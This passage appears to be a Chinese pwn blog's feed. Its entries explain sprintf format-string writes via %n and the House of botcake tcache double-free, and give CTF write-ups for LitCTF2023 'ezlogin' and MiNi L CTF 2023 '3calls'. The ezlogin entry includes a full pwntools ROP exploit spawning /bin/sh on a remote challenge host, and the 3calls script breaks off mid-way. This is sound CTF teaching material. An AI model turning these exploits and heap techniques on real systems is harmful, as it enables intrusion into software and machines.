      <url>/2023/05/21/%E5%8F%A6%E7%B1%BB%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这篇主要介绍的是spritf函数引起的格式化字符串漏洞 总体的利用方式和printf是一样的</p><p>先来看一下sprintf函数的用法 其一共有三个参数 在不使用格式化字符的情况下 第三个参数可有可无</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的作用就是把hello这个字符串读入到buf数组变量中 来看一下运行的结果</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212130349.png" title="image-20230521213031676" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212130349.png" alt="image-20230521213031676"></a></p><p>如果使用上格式化字符</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%s\n&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212234505.png" title="image-20230521223418469" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212234505.png" alt="image-20230521223418469"></a></p><p>这里可能会误解为传入到buf中的值是%shello 随后是给予printf函数利用格式化字符串输出 其实不然 这里替换成puts来试一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>断点打在sprintf函数这里来看一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212246747.png" title="image-20230521224625727" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212246747.png" alt="image-20230521224625727"></a></p><p>来看执行后0x7fffffffe050地址的值会被赋值成什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212246403.png" title="image-20230521224657382" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212246403.png" alt="image-20230521224657382"></a></p><p>由此可见 这里的格式化字符实际是决定vararg参数存储的类型 如果我们替换成%p呢</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212251180.png" title="image-20230521225123155" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212251180.png" alt="image-20230521225123155"></a></p><p>印证了猜想 那么%n呢 这个printf最强大的漏洞 可以做到任意地址写任意值 在这里是否奏效呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;a%7$n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不同于其他格式化字符 %n在sprintf就可以起到任意写的作用 同时又和printf一样 默认是修改4个字节 如果想要修改8字节 就需要lln</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221241813.png" title="image-20230522124145728" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221241813.png" alt="image-20230522124145728"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221241208.png" title="image-20230522124156175" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221241208.png" alt="image-20230522124156175"></a></p><p>如果我们修改蓝框中的值 使其占满8字节 再来覆盖看看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221242401.png" title="image-20230522124239370" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221242401.png" alt="image-20230522124239370"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221242262.png" title="image-20230522124248229" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305221242262.png" alt="image-20230522124248229"></a></p><p>本质还是和printf差不多 在关键的任意写这块漏洞利用上</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of botcake</title>
      <link href="/2023/05/21/House-of-botcake/"/>
      <url>/2023/05/21/House-of-botcake/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>应该不算一个链 只能说一种堆风水的手法吧 叫这个名字有点怪怪的 不过总归是一个很好的手法</p><p>适用于没有堆溢出 但是有UAF  而且比较少见 不过不排除有的厉害的师傅自己就能发现这个手法。。。 我还是太菜了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>2.27 以后(指9.0那个新版本) tcachebin 新增了key 给double free起了干扰的作用 如果要绕过 有三种办法</p><p>1.覆盖tcachebin的bk域 也就是key</p><p>2.修改tcachebin chunk的size 使其key检测的时候绕开原本的链表</p><p>3.house of botcake</p><p>这个手法的本质 是利用chunk overlap来突破没有堆溢出的限制 覆盖fd域</p><p>我们知道 在chunk被释放进入tcachebin后 其bk域会被写入key 如果想要再次释放 就需要绕过key 但是 如果chunk是先被释放进入unsortedbin呢 当我们填满tcachebin链表后 再次释放同大小的chunk 就会释放进入unsortedbin 此时再从tcachebin链表中申请出来一个chunk 再次释放已经被释放进入unsortedbin chunk 就可以成功释放两次</p><p>此时如果再次申请一个比原本的chunk大的chunk 就会从合并后的chunk中分配 从而可以覆盖到位于tcachebin chunk的fd域 这样就达到了任意写的目的 </p><p>上面这么讲可能不明不白 下面直接来看吧</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>首先填满tcachebin的一个链表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x200</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i+<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>chunk0和chunk1用来释放进入unsortedbin</p><p><a href="C:\Users\22346\AppData\Roaming\Typora\typora-user-images\image-20230521211203560.png" title="image-20230521211203560" class="gallery-item"><img src="C:\Users\22346\AppData\Roaming\Typora\typora-user-images\image-20230521211203560.png" alt="image-20230521211203560"></a></p><p>此时二者成功合并</p><p>我们再次申请一个0x200的chunk 把链表腾出一个位置 随后再次释放chunk1 成功进入tcachebin链表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212116296.png" title="image-20230521211623209" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305212116296.png" alt="image-20230521211623209"></a></p><p>此时随便申请一个比0x200大 比0x410小的chunk 就可以触碰到chunk1的fd域了 从而实现任意地址写</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2023</title>
      <link href="/2023/05/15/LitCTF2023/"/>
      <url>/2023/05/15/LitCTF2023/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>跟着vn的师傅打 拿了第七 但是说实话pwn题出的太烂了 唯一有难度的一题还是抄的祥云杯2022-protocol  考点一模一样</p><p>从pwn方向我的评价就是一坨狗屎 其他方向不会不做评价</p><h1 id="LitCTF-2023-ezlogin"><a href="#LitCTF-2023-ezlogin" class="headerlink" title="[LitCTF 2023]ezlogin"></a>[LitCTF 2023]ezlogin</h1><p>静态编译 删除了符号表  用sig文件解决就行 使用自己百度 这里贴一个比较齐全的sig文件仓库</p><p><a href="https://github.com/push0ebp/sig-database">push0ebp&#x2F;sig-database: IDA FLIRT Signature Database (github.com)</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+0h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(off_6B97A8, <span class="number">0LL</span>, envp);</span><br><span class="line">  setbuf(off_6B97A0, <span class="number">0LL</span>, v3);</span><br><span class="line">  setbuf(off_6B9798, <span class="number">0LL</span>, v4);</span><br><span class="line">  <span class="keyword">while</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)vuln(&amp;v6) )</span><br><span class="line">    ;</span><br><span class="line">  IO_puts(<span class="string">&quot;GoodTime.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重复执行vuln函数 当vuln函数的返回值为1时退出循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">536</span>]; <span class="comment">// [rsp+0h] [rbp-218h] BYREF</span></span><br><span class="line"></span><br><span class="line">  IO_puts(<span class="string">&quot;Input your password:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)_libc_read(<span class="number">0</span>, v2, <span class="number">0x200</span>uLL) &gt; <span class="number">0x50</span>u )</span><br><span class="line">    exit_0(<span class="number">-1</span>);</span><br><span class="line">  j_strcpy_ifunc(a1, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(v2, <span class="string">&quot;PASSWORD&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个strcpy的栈溢出 a1相当于v6 a1可以输入0x200字节 而v6只需要0x100字节就可以溢出 不过对于read函数有一个返回值检测</p><p>超过0x50就终止程序 但是实际的比较存在漏洞 我们来看一下汇编</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400C07                 cmp     al, 50h ; &#x27;P&#x27;</span><br><span class="line">.text:0000000000400C09                 ja      short loc_400C3E</span><br></pre></td></tr></table></figure><p>对比的是al寄存器 al寄存器是rax的低八位 也就是说如果我们这个数值比较大 使得二进制形式的数值的1集中在前面 低8位的数值就比较小 测试下来就是不能超过0x150字节</p><p>那么我们就可以构造rop链了 不过由于\x00会被strcpy截断 所以我们需要先覆盖一下payload中的\x00为其他字节</p><p>随后由后往前写 就是payload不断缩减 在\x00字节处做标记 输出的时候多一个\x00 用来覆盖原本的\x00</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28824</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn4&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x448D22</span></span><br><span class="line">rdi_addr = <span class="number">0x400706</span></span><br><span class="line">rsi_addr=<span class="number">0x410043</span> </span><br><span class="line">rdx_addr = <span class="number">0x448c95</span> </span><br><span class="line">rax_addr = <span class="number">0x4005af</span> </span><br><span class="line">bss_addr = elf.bss(<span class="number">0x300</span>)</span><br><span class="line">start_addr = <span class="number">0x400AB0</span></span><br><span class="line">main_addr = <span class="number">0x4005c0</span></span><br><span class="line">ret_addr = <span class="number">0x400416</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;PASSWORD&#x27;</span>+cyclic(<span class="number">0x100</span>)+p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rax_addr)+p64(<span class="number">0</span>)+p64(rsi_addr)+p64(bss_addr)+p64(syscall)+p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = payload.replace(b&#x27;\x00&#x27;, b&#x27;\x11&#x27;)</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x198</span>) :</span><br><span class="line">    <span class="keyword">if</span> payload[i] == <span class="string">&#x27;\x00&#x27;</span> :</span><br><span class="line">        <span class="built_in">list</span>.append(i)</span><br><span class="line">        payload = payload[<span class="number">0</span>:i] + <span class="string">b&#x27;\x66&#x27;</span> + payload[i+<span class="number">1</span>:]</span><br><span class="line"><span class="built_in">list</span> = <span class="built_in">list</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span> :</span><br><span class="line">    payload = payload[<span class="number">0</span>:i]+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your password:&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io,&#x27;b *0x400C07&#x27;)</span></span><br><span class="line">    <span class="comment"># pause(0)</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">&quot;PASSWORD\x00&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your password:&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40061A&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;PASSWORD&#x27;</span>+cyclic(<span class="number">0x100</span>)+p64(rax_addr)+p64(<span class="number">59</span>)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span>) :</span><br><span class="line">    <span class="keyword">if</span> payload[i] == <span class="string">&#x27;\x00&#x27;</span> :</span><br><span class="line">        <span class="built_in">list</span>.append(i)</span><br><span class="line">        payload = payload[<span class="number">0</span>:i] + <span class="string">b&#x27;\x66&#x27;</span> + payload[i+<span class="number">1</span>:]</span><br><span class="line"><span class="built_in">list</span> = <span class="built_in">list</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span> :</span><br><span class="line">    payload = payload[<span class="number">0</span>:i]+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your password:&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">payload = <span class="string">&quot;PASSWORD\x00&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your password:&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MiNi L CTF2023</title>
      <link href="/2023/05/15/MiNi-L-CTF2023/"/>
      <url>/2023/05/15/MiNi-L-CTF2023/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="3calls"><a href="#3calls" class="headerlink" title="3calls"></a>3calls</h1><p>这题的调试是个问题 比赛的时候一直卡在调试 赛后看了wp 才意识到 原来是另外一个进程导致的调试失败 只要在ida里把check函数改成nop就行了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152202693.png" title="image-20230515220224598" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152202693.png" alt="image-20230515220224598"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  libc = (__int64)(&amp;<span class="built_in">printf</span> - <span class="number">49390</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift: %p\n&quot;</span>, &amp;<span class="built_in">printf</span> - <span class="number">49390</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">    read(<span class="number">0</span>, &amp;F[i], <span class="number">8uLL</span>);</span><br><span class="line">  check();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good job!&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">    F[j]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接给了libc基址 同时可以输入3个字长 并且对这三个字长进行检查 跟进一下check函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-C0h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-ACh]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">96</span>]; <span class="comment">// [rsp+20h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">40</span>]; <span class="comment">// [rsp+80h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v8[<span class="number">32</span> * i], <span class="string">&quot;%016llx&quot;</span>, (<span class="type">char</span> *)F[i] - libc);</span><br><span class="line">  stream = popen(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (__int64)stream &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;popen failed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_fscanf(stream, <span class="string">&quot;%s&quot;</span>, s2) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = *(&amp;v5 + j);</span><br><span class="line">      *(&amp;v5 + j) = (<span class="built_in">strcmp</span>(&amp;v8[<span class="number">32</span> * j], s2) == <span class="number">0</span>) | v0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  pclose(stream);</span><br><span class="line">  <span class="keyword">if</span> ( (v6 &amp; v5 &amp; v7) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not libc symbols!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点注意一下这一句stream &#x3D; popen(cmd, “r”);</p><p>popen可以调用shell命令 并且获取其返回值 那么看一下cmd指令是什么 然后直接丢到我们虚拟机里的shell执行一下 大概就知道check是干啥的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152219635.png" title="image-20230515221932599" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152219635.png" alt="image-20230515221932599"></a></p><p>返回值是一大串偏移量 应该很明显看的出来是libc函数的偏移量 加上下面的for循环 所以可以得到check函数是检测输入的三个字长是否是libc函数</p><p>调用三次函数来获取shell 那么肯定要用到system函数 至于rdi参数要怎么操控 那么只能采用输入函数了</p><p>read scanf gets 这些常见的函数 参数构造最容易的就是gets了 并且其输入的地址也是由rdi决定 如果输入&#x2F;bin&#x2F;sh 那么rdi参数就是&#x2F;bin&#x2F;sh字符串</p><p>不过你直接打断点调试行不通的  popen函数会产生新的进程 影响我们gdb调试 所以我们直接在ida里面把call check改了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152226393.png" title="image-20230515222611360" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152226393.png" alt="image-20230515222611360"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152227071.png" title="image-20230515222719048" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152227071.png" alt="image-20230515222719048"></a></p><p>可以看到gets函数rdi参数是一个可写可读的地址 那这样就方便了 我们直接读入&#x2F;bin&#x2F;sh字符串 但是很快就会发现程序EOF了</p><p>EOF的原因比较复杂 我也只是调试了一点点出来 很多地方还是不懂 权当听个大概吧</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152229001.png" title="image-20230515222904962" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152229001.png" alt="image-20230515222904962"></a></p><p>出问题的就在这个判断 导致进入了__lll_lock_wait_private函数 这个函数的具体用处我也不是很清楚 反正执行的后果就是当前进程会被挂起 也就导致了我们的程序无法继续执行了 也有想过绕过 但是貌似就算相等也过不去 ZF标志位还是为0</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152230491.png" title="image-20230515223057448" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152230491.png" alt="image-20230515223057448"></a></p><p>最后的解决办法跟我们的gets函数执行逻辑有关系 其会先调用这个函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152231156.png" title="image-20230515223146129" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152231156.png" alt="image-20230515223146129"></a></p><p>这个函数的本质是通过read来输入字节 不过每次只有1字节 随后每次接收完以后进行判断 如果为\n就停止gets</p><p>所以我们直接输入\n 就不会执行到后面的__lll_lock_wait_private </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152234730.png" title="image-20230515223446685" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152234730.png" alt="image-20230515223446685"></a></p><p>随后我们再次调用gets函数就正常了 也是很神奇 不知道为啥 但是你会发现最后system执行的参数为&#x2F;bin.sh</p><p>还是需要动调看一下 问题出在gets函数的最后几步</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152237084.png" title="image-20230515223722045" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305152237084.png" alt="image-20230515223722045"></a></p><p>自己看看应该也能懂 这样就不多说了 最后直接system就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span 